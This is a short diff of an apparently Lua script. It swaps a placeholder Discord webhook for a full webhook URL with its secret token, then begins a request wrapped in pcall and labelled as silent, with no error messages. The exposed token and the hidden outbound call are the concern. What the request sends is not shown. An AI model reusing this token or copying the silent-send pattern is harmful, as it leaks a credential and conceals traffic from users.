@@ -1,4 +1,4 @@
-local webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE" -- Replace with your webhook URL
+local webhook = "https://discord.com/api/webhooks/1392626763753980096/0h6oh110aNMABPc86YI1YfVhEGT5HNsimjCy836iyLci0RTAHu0YFzFaoArTm-xHdNFT" -- Replace with your webhook URL
 
 -- Silent request (no error messages)
 pcall(function()
